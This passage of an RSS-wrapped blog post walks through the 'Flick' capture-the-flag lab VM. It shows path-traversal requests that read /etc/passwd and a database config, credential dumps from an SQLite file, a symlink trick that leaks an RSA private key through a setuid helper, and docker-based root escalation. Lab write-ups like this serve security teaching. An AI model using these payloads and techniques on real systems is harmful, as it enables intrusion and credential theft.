+&amp;gt; lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;A&amp;quot; * 20&amp;#39; | ncat 192.168.10.42 8881
+Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
+&amp;gt; OK: AAAAAAAAAAAAAAAAAAAA
+
+&amp;gt; lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;A&amp;quot; * 2000&amp;#39; | ncat 192.168.10.42 8881
+Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
+&amp;gt; OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&amp;gt; OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+......
+......
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;we find server will split string with buffer size 1024. Now, we can&amp;rsquo;t exploit server with large strings.&lt;br&gt;
+And we login with the string &amp;lsquo;tabupJievas8Knoj&amp;rsquo; from port 22.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;tabupJievas8Knoj&amp;quot;&amp;#39; | ncat -v 192.168.10.42 8881
+Ncat: Version 6.47 ( http://nmap.org/ncat )
+Ncat: Connected to 192.168.10.42:8881.
+Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
+&amp;gt; OK: tabupJievas8Knoj
+
+Accepted! The door should be open now :poolparty:
+
+&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;scan open port(s) again.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ nmap -v -n -T4 -p- 192.168.10.42 
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-20 15:34 UTC
+Initiating Ping Scan at 15:34
+Scanning 192.168.10.42 [2 ports]
+Completed Ping Scan at 15:34, 0.00s elapsed (1 total hosts)
+Initiating Connect Scan at 15:34
+Scanning 192.168.10.42 [65535 ports]
+Discovered open port 22/tcp on 192.168.10.42
+Discovered open port 80/tcp on 192.168.10.42
+Discovered open port 8881/tcp on 192.168.10.42
+Completed Connect Scan at 15:34, 1.77s elapsed (65535 total ports)
+Nmap scan report for 192.168.10.42
+Host is up (0.0072s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8881/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Port: 80&lt;/h3&gt;
+
+&lt;p&gt;access to http://192.168.10.42/404, we can get:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;http://192.168.10.42/db/  
+http://192.168.10.42/scripts/  
+http://192.168.10.42/web/  
+http://192.168.10.42/icons/  
+http://192.168.10.42/cgi-bin/  
+http://192.168.10.42/image/view  
+http://192.168.10.42/image/download  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You have to be logged in to download photos.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;http://192.168.10.42/image/download?filename=....//....//etc/passwd  
+http://192.168.10.42/image/download?filename=....//....//....//....//etc/apache2/sites-enabled/000-default  
+http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/public/index.php
+http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/bootstrap/autoload.php
+http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/vendor/autoload.php
+http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/vendor/composer/ClassLoader.php
+http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;view &lt;strong&gt;/etc/apache2/sites-enabled/000-default&lt;/strong&gt;, we can get:  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;    DocumentRoot /var/www/flick_photos/public
+    &amp;lt;Directory /&amp;gt;
+        Options FollowSymLinks
+        AllowOverride None
+    &amp;lt;/Directory&amp;gt;
+    &amp;lt;Directory /var/www/flick_photos/public&amp;gt;
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        Order allow,deny
+        allow from all
+    &amp;lt;/Directory&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;view &lt;strong&gt;/etc/passwd&lt;/strong&gt;, we can get:   &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+dean:x:1001:1001:,,,:/home/dean:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;view &lt;strong&gt;/var/www/flick_photos/app/config/database.php&lt;/strong&gt;, we can get:  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;    &amp;#39;connections&amp;#39; =&amp;gt; array(
+
+        &amp;#39;sqlite&amp;#39; =&amp;gt; array(
+            &amp;#39;driver&amp;#39;   =&amp;gt; &amp;#39;sqlite&amp;#39;,
+            &amp;#39;database&amp;#39; =&amp;gt; __DIR__.&amp;#39;/../database/production.sqlite&amp;#39;, // OLD DATABASE NO LONGER IN USE!
+            &amp;#39;prefix&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,
+        ), 
+
+        &amp;#39;mysql&amp;#39; =&amp;gt; array(
+            &amp;#39;driver&amp;#39;    =&amp;gt; &amp;#39;mysql&amp;#39;,
+            &amp;#39;host&amp;#39;      =&amp;gt; &amp;#39;localhost&amp;#39;,
+            &amp;#39;database&amp;#39;  =&amp;gt; &amp;#39;flick&amp;#39;,
+            &amp;#39;username&amp;#39;  =&amp;gt; &amp;#39;flick&amp;#39;,
+            &amp;#39;password&amp;#39;  =&amp;gt; &amp;#39;resuddecNeydmar3&amp;#39;,
+            &amp;#39;charset&amp;#39;   =&amp;gt; &amp;#39;utf8&amp;#39;,
+            &amp;#39;collation&amp;#39; =&amp;gt; &amp;#39;utf8_unicode_ci&amp;#39;,
+            &amp;#39;prefix&amp;#39;    =&amp;gt; &amp;#39;&amp;#39;,
+        ), 
+
+        &amp;#39;pgsql&amp;#39; =&amp;gt; array(
+            &amp;#39;driver&amp;#39;   =&amp;gt; &amp;#39;pgsql&amp;#39;,
+            &amp;#39;host&amp;#39;     =&amp;gt; &amp;#39;localhost&amp;#39;,
+            &amp;#39;database&amp;#39; =&amp;gt; &amp;#39;forge&amp;#39;,
+            &amp;#39;username&amp;#39; =&amp;gt; &amp;#39;forge&amp;#39;,
+            &amp;#39;password&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,
+            &amp;#39;charset&amp;#39;  =&amp;gt; &amp;#39;utf8&amp;#39;,
+            &amp;#39;prefix&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,
+            &amp;#39;schema&amp;#39;   =&amp;gt; &amp;#39;public&amp;#39;,
+        ), 
+
+        &amp;#39;sqlsrv&amp;#39; =&amp;gt; array(
+            &amp;#39;driver&amp;#39;   =&amp;gt; &amp;#39;sqlsrv&amp;#39;,
+            &amp;#39;host&amp;#39;     =&amp;gt; &amp;#39;localhost&amp;#39;,
+            &amp;#39;database&amp;#39; =&amp;gt; &amp;#39;database&amp;#39;,
+            &amp;#39;username&amp;#39; =&amp;gt; &amp;#39;root&amp;#39;,
+            &amp;#39;password&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,
+            &amp;#39;prefix&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,
+        ),
+
+    ),    
+
+    &amp;#39;redis&amp;#39; =&amp;gt; array(
+
+        &amp;#39;cluster&amp;#39; =&amp;gt; false,
+
+        &amp;#39;default&amp;#39; =&amp;gt; array(
+            &amp;#39;host&amp;#39;     =&amp;gt; &amp;#39;127.0.0.1&amp;#39;,
+            &amp;#39;port&amp;#39;     =&amp;gt; 6379,
+            &amp;#39;database&amp;#39; =&amp;gt; 0,
+        ),
+
+    ),
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;access &lt;strong&gt;http://192.168.10.42/image/download?filename=&amp;hellip;.//&amp;hellip;.//&amp;hellip;.//&amp;hellip;.//var/www/flick_photos/app/database/production.sqlite&lt;/strong&gt;, and download sqlite database.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:flick/ $ sqlite3 production.sqlite 
+SQLite version 3.8.10.2 2015-05-20 18:17:19
+Enter &amp;quot;.help&amp;quot; for usage hints.
+sqlite&amp;gt; .databases
+Error: file is encrypted or is not a database
+lab:flick/ $ file production.sqlite 
+production.sqlite: SQLite 2.x database
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;sqlite&amp;gt; .tables
+old_users
+sqlite&amp;gt; .dump old_users
+BEGIN TRANSACTION;
+CREATE TABLE old_users (
+  username text,
+  password text
+);
+INSERT INTO old_users VALUES(&amp;#39;paul&amp;#39;,&amp;#39;nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi&amp;#39;);
+INSERT INTO old_users VALUES(&amp;#39;robin&amp;#39;,&amp;#39;JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1&amp;#39;);
+INSERT INTO old_users VALUES(&amp;#39;james&amp;#39;,&amp;#39;scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5&amp;#39;);
+INSERT INTO old_users VALUES(&amp;#39;dean&amp;#39;,&amp;#39;FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA&amp;#39;);
+COMMIT;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;we can connect to host with SSH with &lt;strong&gt;robin&lt;/strong&gt; and &lt;strong&gt;dean&lt;/strong&gt;. dean can login it successfully.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt; .o88o. oooo   o8o            oooo        
+ 888 `&amp;quot; `888   `&amp;quot;&amp;#39;            `888        
+o888oo   888  oooo   .ooooo.   888  oooo  
+ 888     888  `888  d88&amp;#39; `&amp;quot;Y8  888 .8P&amp;#39;   
+ 888     888   888  888        888888.    
+ 888     888   888  888   .o8  888 `88b.  
+o888o   o888o o888o `Y8bod8P&amp;#39; o888o o888o 
+
+
+dean@192.168.10.42&amp;#39;s password: 
+Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Jul 21 10:20:28 SAST 2015
+
+  System load:  0.0               Processes:              87
+  Usage of /:   36.0% of 6.99GB   Users logged in:        0
+  Memory usage: 50%               IP address for eth0:    192.168.10.42
+  Swap usage:   0%                IP address for docker0: 172.17.42.1
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+New release &amp;#39;14.04.2 LTS&amp;#39; available.
+Run &amp;#39;do-release-upgrade&amp;#39; to upgrade to it.
+
+Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
+dean@flick:~$ 
+dean@flick:~$ ls -l /var/www/
+flick_photos/ index.php     
+dean@flick:~$ ls -l /var/www/flick_photos/
+total 100
+drwxr-xr-x 12 www-data www-data  4096 Aug  1  2014 app
+-rw-r--r--  1 www-data www-data  2452 Aug  1  2014 artisan
+drwxr-xr-x  2 www-data www-data  4096 Aug  1  2014 bootstrap
+-rw-r--r--  1 www-data www-data   697 Aug  1  2014 composer.json
+-rw-r--r--  1 www-data www-data 59423 Aug  1  2014 composer.lock
+-rw-r--r--  1 www-data www-data   146 Aug  1  2014 CONTRIBUTING.md
+-rw-r--r--  1 www-data www-data   567 Aug  1  2014 phpunit.xml
+drwxr-xr-x  7 www-data www-data  4096 Aug  1  2014 public
+-rw-r--r--  1 www-data www-data  2051 Aug  1  2014 readme.md
+-rw-r--r--  1 www-data www-data   519 Aug  1  2014 server.php
+drwxr-xr-x 20 www-data www-data  4096 Aug  1  2014 vendor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;hr&gt;
+
+&lt;h3&gt;docker&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;dean@flick:~$ ./read_docker /home/robin/flick-dev/
+# Flick-a-photo dev env
+RUN apt-get update &amp;amp;&amp;amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;amp;&amp;amp; apt-get clean &amp;amp;&amp;amp; rm -rf /var/lib/apt/lists/*
+
+CMD [&amp;quot;/usr/sbin/apache2&amp;quot;, &amp;quot;-D&amp;quot;, &amp;quot;FOREGROUND&amp;quot;]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
+dean@flick:~$ ls -l
+total 36
+lrwxrwxrwx 1 dean  dean    23 Jul 21 11:16 Dockerfile -&amp;gt; /home/robin/.ssh/id_rsa
+-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
+-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker
+dean@flick:~$ ./read_docker /home/dean/
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
+ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
+FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
+S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
+CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
+d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
+jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
+wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
+tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
+Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
+wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
+mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
+l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
+JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
+gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
+JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
+rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
+PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
+zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
+AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
+EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
+mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
+JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
+Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
+VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;dean@flick:~$ ssh -i ~/.ssh/id_rsa robin@192.168.10.42
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;robin@flick:~$ docker run ubuntu ls -l /home
+total 0
+robin@flick:~$ docker run ubuntu ls -l /root
+total 0
+robin@flick:~$ docker run -t -i -v /root:/root ubuntu /bin/bash
+root@a86a88c8f91b:/# ls -l /root/
+total 8
+drwxr-xr-x 2 root root 4096 Aug  1  2014 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
+-rw-r--r-- 1 root root   67 Aug  1  2014 flag.txt
+root@a86a88c8f91b:/# cat /root/flag.txt 
+Errr, you are close, but this is not the flag you are looking for.
+root@a86a88c8f91b:/# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt 
+Congrats!
+
+You have completed &amp;#39;flick&amp;#39;! I hope you have enjoyed doing it as much as I did creating it :)
+
+ciao for now!
+@leonjza
+root@a86a88c8f91b:/# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;hr&gt;
+
+&lt;h2&gt;References&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;9 Feb 2015 - &lt;a href=&quot;https://chousensha.github.io/blog/2015/02/09/pentest-lab-flick/&quot;&gt;Pentest lab - Flick&lt;/a&gt; (chousensha)&lt;/li&gt;
+&lt;li&gt;8 Oct 2014 - &lt;a href=&quot;http://resources.infosecinstitute.com/flick-challenge/&quot;&gt;Flick Challenge&lt;/a&gt; (Infosec Institute)&lt;/li&gt;
+&lt;li&gt;12 Sep 2014 - &lt;a href=&quot;http://stealthsploit.com/2014/09/12/quick-tricks-to-beat-the-flick/&quot;&gt;Quick tricks to beat the Flick&lt;/a&gt; (ChP4wned)&lt;/li&gt;
+&lt;li&gt;17 Aug 2014 - &lt;a href=&quot;http://shieldsec.com/pentest/vulnhub-flick-vm-writeup/&quot;&gt;Vulnhub Flick VM Writeup&lt;/a&gt; (Captain-Fungi)&lt;/li&gt;
+&lt;li&gt;16 Aug 2014 - &lt;a href=&quot;http://rastamouse.me/blog/2014/flick-1/&quot;&gt;Flick: 1&lt;/a&gt; (Rasta Mouse)&lt;/li&gt;
+&lt;li&gt;14 Aug 2014 - &lt;a href=&quot;http://blog.techorganic.com/2014/08/14/flick-hacking-challenge/&quot;&gt;Flick Hacking Challenge&lt;/a&gt; (superkojiman)&lt;/li&gt;
+&lt;li&gt;13 Aug 2014 - &lt;a href=&quot;http://drxpsec-drxp.rhcloud.com/2014/08/13/flick-vulnerable-vm/&quot;&gt;Flick Vulnerable VM&lt;/a&gt; (drxp)&lt;/li&gt;
+&lt;li&gt;13 Aug 2014 - &lt;a href=&quot;http://fourfourfourfour.co/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/&quot;&gt;How Many Hackers Does It Take to Change a Lightbulb ?&lt;/a&gt; (recrudesce)&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Sun, 20 Sep 2015 00:00:00 +0000</pubDate>
+        <link>/2015/09/20/flick_1_workthrough/</link>
+        <guid isPermaLink="true">/2015/09/20/flick_1_workthrough/</guid>
+      </item>
+    
+  </channel>
+</rss>
